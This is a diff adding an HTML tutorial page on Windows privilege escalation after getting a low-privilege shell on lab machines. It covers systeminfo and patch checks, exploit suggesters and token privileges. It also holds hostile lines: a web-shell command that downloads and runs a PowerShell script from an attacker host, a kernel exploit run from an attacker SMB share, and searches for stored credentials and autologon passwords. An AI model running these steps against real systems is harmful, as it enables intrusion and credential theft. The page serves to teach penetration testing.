@@ -1,0 +1,1394 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R21NVEB2EY"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-R21NVEB2EY');
+    </script>
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Unprivileged Shell to Privileged Shell &mdash; tech.bitvijays.com 2.0.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=80d5e7a1" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=19f00094" />
+
+  
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script src="../_static/documentation_options.js?v=51b770b3"></script>
+        <script src="../_static/doctools.js?v=888ff710"></script>
+        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+        <script src="../_static/debug.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="Tips and Tricks" href="LFC-VM-P3-TipsAndTricks.html" />
+    <link rel="prev" title="From Nothing to a Unprivileged Shell" href="LFC-VM-P1-FromNothingToUnprivilegedShell.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            tech.bitvijays.com
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">The Essentials</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0A-CyberSecurityEnterprise.html">Cybersecurity in an Enterprise</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0B-LinuxEssentials.html">Linux Basics</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0C-CloudEssentials.html">Cloud Infrastructure Technologies</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0E-OpenSource.html">Open Source Concepts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0D-SecureSoftware.html">Secure Software Development Fundamentals</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0F-IndustrialControlSystems.html">Industrial Control Systems</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Infrastructure Pentest</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P1-IntelligenceGathering.html">Intelligence Gathering</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P2-VulnerabilityAnalysis.html">Vulnerability Analysis</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P3-Exploitation.html">Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P4-PostExploitation.html">Post Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P5-Reporting.html">Reporting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P6-ConfigurationReview.html">Configuration Review</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Vulnerable Machines</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P0-InitialRecon.html">Initial Recon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P1-FromNothingToUnprivilegedShell.html">From Nothing to a Unprivileged Shell</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Unprivileged Shell to Privileged Shell</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#windows-privilege-escalation">Windows Privilege Escalation</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#systeminfo">SystemInfo</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#metasploit-local-exploit-suggestor">Metasploit Local Exploit Suggestor</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sherlock-and-powerup-powershell-script">Sherlock and PowerUp Powershell Script</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#windows-exploit-suggestor">Windows Exploit Suggestor</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#windows-kernel-exploits">Windows Kernel Exploits</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#abusing-token-privileges">Abusing Token Privileges</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#credential-manager">Credential Manager</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#other-enumeration">Other Enumeration</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#environment-variables">Environment Variables</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#connected-drives">Connected Drives</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#users">Users</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#programs">Programs</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#processes-services">Processes/ Services</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#scheduled-tasks">Scheduled Tasks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#startup">Startup?</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#networking">Networking</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#firewall-configuration">Firewall Configuration</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#snmp-configuration">SNMP Configuration</a></li>
+</ul>
+</li>
+<li class="toctree-l4"><a class="reference internal" href="#sensitive-files">Sensitive Files</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#passwords-in-the-registry">Passwords in the registry</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#interesting-files-to-look-at-possibly-inside-user-directories-desktop-documents-etc">Interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#files-containing-password-inside-them">Files containing password inside them?</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#linux-privilege-escalation">Linux Privilege Escalation</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#privilege-escalation-from-g0tm1lk-blog">Privilege escalation from g0tm1lk blog</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#what-advanced-linux-file-permissions-are-used">What “Advanced Linux File Permissions” are used?</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#where-can-written-to-and-executed-from">Where can written to and executed from?</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#any-problem-files">Any “problem” files?</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#find-files-folder-owned-by-the-user">Find files/ folder owned by the user</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#other-linux-privilege-escalation">Other Linux Privilege Escalation</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#execution-of-binary-from-relative-location-than-absolute">Execution of binary from Relative location than Absolute</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#environment-variable-abuse">Environment Variable Abuse</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#world-writable-folder-with-a-script-executing-any-file-in-that-folder-using-crontab">World-Writable Folder with a Script executing any file in that folder using crontab</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#symlink-creation">Symlink Creation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#directory-symlink">Directory Symlink</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#time-of-check-to-time-of-use">Time of check to time of use</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#learning">Learning</a></li>
+</ul>
+</li>
+<li class="toctree-l4"><a class="reference internal" href="#writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system">Writable /etc/passwd or account credentials came from a legacy unix system</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#elevating-privilege-from-a-suid-binary">Elevating privilege from a suid binary</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#executing-python-script-with-sudo">Executing Python script with sudo</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#example">Example</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#mysql-privileged-escalation">MySQL Privileged Escalation</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#more-information">More Information</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#cron-d">Cron.d</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#pspy">pspy</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#unattended-apt-upgrade">Unattended APT - Upgrade</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#dpkg">DPKG</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#apt">APT</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#sudo-l-permissions">SUDO -l Permissions</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#vi">vi</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#nmap-suid">nmap suid</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#tee-suid">tee suid</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#tcpdump">tcpdump</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#zip">zip</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#find">find</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#wget">wget</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#package-installation">Package Installation</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#pip">pip</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#npm">npm</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#unix-wildcards">Unix Wildcards</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#chown-file-reference-trick-file-owner-hijacking">Chown file reference trick (file owner hijacking)</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#chmod-file-reference-trick">Chmod file reference trick</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#tar-arbitrary-command-execution">Tar arbitrary command execution</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#rsync-arbitrary-command-execution">Rsync arbitrary command execution</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P3-TipsAndTricks.html">Tips and Tricks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P4-Appendix.html">Appendix</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">CTF - Challenges</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-BinaryExploitation.html">Binary Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Forensics.html">Forensics</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-ReverseEngineering.html">Reverse Engineering</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Cryptography.html">Cryptography</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-CodingQuickRef.html">Coding Quick Reference</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Critical Infrastructure</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html">Electrical Grid</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">tech.bitvijays.com</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Unprivileged Shell to Privileged Shell</li>
+      <li class="wy-breadcrumbs-aside">
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="unprivileged-shell-to-privileged-shell">
+<h1>Unprivileged Shell to Privileged Shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Link to this heading"></a></h1>
+<p>Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions.</p>
+<p>[Linux] If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.</p>
+<section id="windows-privilege-escalation">
+<h2>Windows Privilege Escalation<a class="headerlink" href="#windows-privilege-escalation" title="Link to this heading"></a></h2>
+<p>If you have a shell/ meterpreter from a windows box, probably, the first thing would be to utilize</p>
+<section id="systeminfo">
+<h3>SystemInfo<a class="headerlink" href="#systeminfo" title="Link to this heading"></a></h3>
+<p>Run system info and findout</p>
+<ul class="simple">
+<li><p>Operating System Version</p></li>
+<li><p>Architecture : Whether x86 or x64.</p></li>
+<li><p>Hotfix installed</p></li>
+</ul>
+<p>The below system is running x64, Windows Server 2008 R2 with no Hotfixes installed.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">systeminfo</span>
+
+<span class="go">Host Name:                 VICTIM-MACHINE</span>
+<span class="go">OS Name:                   Microsoft Windows Server 2008 R2 Datacenter</span>
+<span class="go">OS Version:                6.1.7600 N/A Build 7600</span>
+<span class="go">OS Manufacturer:           Microsoft Corporation</span>
+<span class="go">OS Configuration:          Standalone Server</span>
+<span class="go">OS Build Type:             Multiprocessor Free</span>
+<span class="go">Registered Owner:          Windows User</span>
+<span class="go">Registered Organization:</span>
+<span class="go">Product ID:                00496-001-0001283-84782</span>
+<span class="go">Original Install Date:     18/3/2017, 7:04:46 ��</span>
+<span class="go">System Boot Time:          7/11/2017, 3:13:00 ��</span>
+<span class="go">System Manufacturer:       VMware, Inc.</span>
+<span class="go">System Model:              VMware Virtual Platform</span>
+<span class="go">System Type:               x64-based PC</span>
+<span class="go">Processor(s):              2 Processor(s) Installed.</span>
+<span class="go">                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz</span>
+<span class="go">                           [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz</span>
+<span class="go">BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016</span>
+<span class="go">Windows Directory:         C:\Windows</span>
+<span class="go">System Directory:          C:\Windows\system32</span>
+<span class="go">Boot Device:               \Device\HarddiskVolume1</span>
+<span class="go">System Locale:             el;Greek</span>
+<span class="go">Input Locale:              en-us;English (United States)</span>
+<span class="go">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul</span>
+<span class="go">Total Physical Memory:     2.048 MB</span>
+<span class="go">Available Physical Memory: 1.640 MB</span>
+<span class="go">Virtual Memory: Max Size:  4.095 MB</span>
+<span class="go">Virtual Memory: Available: 3.665 MB</span>
+<span class="go">Virtual Memory: In Use:    430 MB</span>
+<span class="go">Page File Location(s):     C:\pagefile.sys</span>
+<span class="go">Domain:                    HTB</span>
+<span class="go">Logon Server:              N/A</span>
+<span class="go">Hotfix(s):                 N/A</span>
+<span class="go">Network Card(s):           1 NIC(s) Installed.</span>
+<span class="go">                           [01]: Intel(R) PRO/1000 MT Network Connection</span>
+<span class="go">                                 Connection Name: Local Area Connection</span>
+<span class="go">                                 DHCP Enabled:    No</span>
+<span class="go">                                 IP address(es)</span>
+<span class="go">                                 [01]: 10.54.98.9</span>
+</pre></div>
+</div>
+<p>If there are no Hotfixes installed, we can visit</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">C:\Windows\SoftwareDistribution\Download</span>
+</pre></div>
+</div>
+<p>This directory is the temporary location for WSUS. Updates were downloaded here, doesn’t mean were installed. Otherwise, we may visit</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">C:\Windows\WindowUpdate.log</span>
+</pre></div>
+</div>
+<p>which will inform if any hotfixes are installed.</p>
+<p>We can also run</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wmic qfe</span>
+
+<span class="go">Caption                                     CSName           Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status</span>
+<span class="go">http://support.microsoft.com/?kbid=4100347  LAPTOP           Update                        KB4100347               NT AUTHORITY\SYSTEM  9/17/2018</span>
+<span class="go">http://support.microsoft.com/?kbid=4343669  LAPTOP           Update                        KB4343669               NT AUTHORITY\SYSTEM  7/27/2018</span>
+<span class="go">http://support.microsoft.com/?kbid=4343902  LAPTOP           Security Update               KB4343902               NT AUTHORITY\SYSTEM  8/16/2018</span>
+</pre></div>
+</div>
+</section>
+<section id="metasploit-local-exploit-suggestor">
+<h3>Metasploit Local Exploit Suggestor<a class="headerlink" href="#metasploit-local-exploit-suggestor" title="Link to this heading"></a></h3>
+<p>Metasploit local_exploit_suggester : The module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>It is utmost important that the meterpreter should be of the same architecture as your target machine, otherwise local exploits may fail. For example. if you have target as windows 64-bit machine, you should have 64-bit meterpreter.</p>
+</div>
+</section>
+<section id="sherlock-and-powerup-powershell-script">
+<h3>Sherlock and PowerUp Powershell Script<a class="headerlink" href="#sherlock-and-powerup-powershell-script" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> PowerShell script by <a class="reference external" href="https://twitter.com/_RastaMouse">rastamouse</a> to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn’t resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.</p></li>
+<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a> : PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.</p></li>
+</ul>
+<p>The above can be executed by</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">view-source:10.54.98.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString(&quot;http://YourIP:8000/Sherlock.ps1&quot;); | powershell -noprofile -</span>
+</pre></div>
+</div>
+<p>We execute powershell with noprofile and accept the input from stdin</p>
+</section>
+<section id="windows-exploit-suggestor">
+<h3>Windows Exploit Suggestor<a class="headerlink" href="#windows-exploit-suggestor" title="Link to this heading"></a></h3>
+<p><a class="reference external" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows Exploit Suggestor</a> : This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. Just copy the systeminfo information from the windows OS and compare the database.</p>
+<p>If we are getting the below error on running local exploits of getuid in meterpreter</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getuid: Operation failed: Access is denied.</span>
+</pre></div>
+</div>
+<p>Possibly, migrate into a new process using post/windows/manage/migrate</p>
+</section>
+<section id="windows-kernel-exploits">
+<h3>Windows Kernel Exploits<a class="headerlink" href="#windows-kernel-exploits" title="Link to this heading"></a></h3>
+<p><a class="reference external" href="https://github.com/SecWiki/windows-kernel-exploits">Windows Kernel Exploits</a> contains most of the compiled windows exploits. One way of running these is either upload these on victim system and execute. Otherwise, create a smb-server using Impacket</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support] shareName sharePath</span>
+
+<span class="go">This script will launch a SMB Server and add a share specified as an argument. You need to be root in order to bind to port 445. No authentication will be enforced. Example: smbserver.py -comment &#39;My share&#39; TMP /tmp</span>
+
+<span class="go">positional arguments:</span>
+<span class="go">  shareName         name of the share to add</span>
+<span class="go">  sharePath         path of the share to add</span>
+</pre></div>
+</div>
+<p>Assuming, the current directory contains our compiled exploit, we can</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">impacket-smbserver &lt;sharename&gt; `pwd`</span>
+<span class="go">Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies</span>
+
+<span class="go">[*] Config file parsed</span>
+<span class="go">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span>
+<span class="go">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span>
+<span class="go">[*] Config file parsed</span>
+<span class="go">[*] Config file parsed</span>
+<span class="go">[*] Config file parsed</span>
+</pre></div>
+</div>
+<p>Once, smbserver is up and running, we can execute code like</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">view-source:VictimIP/shell.php?cmd=\\YourIP\ShareName\ms15-051x64.exe whoami</span>
+
+<span class="go">*Considering shell.php is our php oneliner to execute commands.</span>
+</pre></div>
+</div>
+</section>
+<section id="abusing-token-privileges">
+<h3>Abusing Token Privileges<a class="headerlink" href="#abusing-token-privileges" title="Link to this heading"></a></h3>
+<p>If we have the windows shell or meterpreter, we can type “whoami /priv” or if we have meterpreter, we can type “getprivs”</p>
+<p>If we have any of the below privileges, we can possibly utilize <a class="reference external" href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">Rotten Potato</a></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">SeImpersonatePrivilege</span>
+<span class="go">SeAssignPrimaryPrivilege</span>
+<span class="go">SeTcbPrivilege</span>
+<span class="go">SeBackupPrivilege</span>
+<span class="go">SeRestorePrivilege</span>
+<span class="go">SeCreateTokenPrivilege</span>
+<span class="go">SeLoadDriverPrivilege</span>
+<span class="go">SeTakeOwnershipPrivilege</span>
+<span class="go">SeDebugPrivilege</span>
+</pre></div>
+</div>
+<p>The above was for the Windows OS and the below is for Linux OS.</p>
+</section>
+<section id="credential-manager">
+<h3>Credential Manager<a class="headerlink" href="#credential-manager" title="Link to this heading"></a></h3>
+<p>Sometimes, the user might have save his credentials in the memory while using “runas /savecred” option. We could check this by</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">cmdkey /list</span>
+<span class="go">dir C:\Users\username\AppData\Local\Microsoft\Credentials\</span>
+<span class="go">dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span>
+<span class="go">Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\</span>
+<span class="go">Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span>
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Sometimes, while using Metasploit web delivery method, if the reverse_https payload doesn’t work try reverse tcp maybe?</p>
+</div>
+</section>
+<section id="other-enumeration">
+<h3>Other Enumeration<a class="headerlink" href="#other-enumeration" title="Link to this heading"></a></h3>
+<p>Mostly taken from <a class="reference external" href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">Windows Privilege Escalation Guide</a></p>
+<section id="environment-variables">
+<h4>Environment Variables<a class="headerlink" href="#environment-variables" title="Link to this heading"></a></h4>
+<blockquote>
+<div><p>A domain controller in LOGONSERVER?</p>
+</div></blockquote>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">set</span>
+<span class="go">Get-ChildItem Env: | ft Key,Value</span>
+</pre></div>
+</div>
+</section>
+<section id="connected-drives">
+<h4>Connected Drives<a class="headerlink" href="#connected-drives" title="Link to this heading"></a></h4>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net use</span>
+<span class="go">wmic logicaldisk get caption,description,providername</span>
+<span class="go">Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root</span>
+</pre></div>
+</div>
+</section>
+<section id="users">
+<h4>Users<a class="headerlink" href="#users" title="Link to this heading"></a></h4>
+<p>Who are you?</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">whoami</span>
+<span class="go">echo %USERNAME%</span>
+<span class="gp">$</span>env:UserName
+</pre></div>
+</div>
+<p>What users are on the system? Any old user profiles that weren’t cleaned up?</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net users</span>
+<span class="go">dir /b /ad &quot;C:\Users\&quot;</span>
+<span class="go">dir /b /ad &quot;C:\Documents and Settings\&quot; # Windows XP and below</span>
+<span class="go">Get-LocalUser | ft Name,Enabled,LastLogon</span>
+<span class="go">Get-ChildItem C:\Users -Force | select Name</span>
+</pre></div>
+</div>
+<p>Is anyone else logged in?</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">qwinsta</span>
+</pre></div>
+</div>
+<p>What groups are on the system?</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net localgroup</span>
+<span class="go">Get-LocalGroup | ft Name</span>
+</pre></div>
+</div>
+<p>Are any of the users in the Administrators group?</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net localgroup Administrators</span>
+<span class="go">Get-LocalGroupMember Administrators | ft Name, PrincipalSource</span>
+</pre></div>
+</div>
+<p>Anything in the Registry for User Autologon?</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span>
+<span class="go">Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#39; | select &quot;Default*&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="programs">
+<h4>Programs<a class="headerlink" href="#programs" title="Link to this heading"></a></h4>
+<p>What software is installed?</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">dir /a &quot;C:\Program Files&quot;</span>
+<span class="go">dir /a &quot;C:\Program Files (x86)&quot;</span>
+<span class="go">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span>
+<span class="go">Get-ChildItem &#39;C:\Program Files&#39;, &#39;C:\Program Files (x86)&#39; | ft Parent,Name,LastWriteTime</span>
+<span class="go">Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name</span>
+</pre></div>
+</div>
+</section>
+<section id="processes-services">
+<h4>Processes/ Services<a class="headerlink" href="#processes-services" title="Link to this heading"></a></h4>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">tasklist /svc</span>
+<span class="go">tasklist /v</span>
+<span class="go">net start</span>
+<span class="go">sc query</span>
+</pre></div>
+</div>
+<p>Get-Process has a -IncludeUserName option to see the process owner, however you have to have administrative rights to use it.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Get-Process | where {$_.ProcessName -notlike &quot;svchost*&quot;} | ft ProcessName, Id</span>
+<span class="go">Get-Service</span>
+</pre></div>
+</div>
+<p>This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Get-WmiObject -Query &quot;Select * from Win32_Process&quot; | where {$_.Name -notlike &quot;svchost*&quot;} | Select Name, Handle, @{Label=&quot;Owner&quot;;Expression={$_.GetOwner().User}} | ft -AutoSize</span>
+</pre></div>
+</div>
+</section>
+<section id="scheduled-tasks">
+<h4>Scheduled Tasks<a class="headerlink" href="#scheduled-tasks" title="Link to this heading"></a></h4>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">schtasks /query /fo LIST 2&gt;nul | findstr TaskName</span>
+<span class="go">dir C:\windows\tasks</span>
+<span class="go">Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State</span>
+</pre></div>
+</div>
+</section>
+<section id="startup">
+<h4>Startup?<a class="headerlink" href="#startup" title="Link to this heading"></a></h4>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wmic startup get caption,command</span>
+<span class="go">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span>
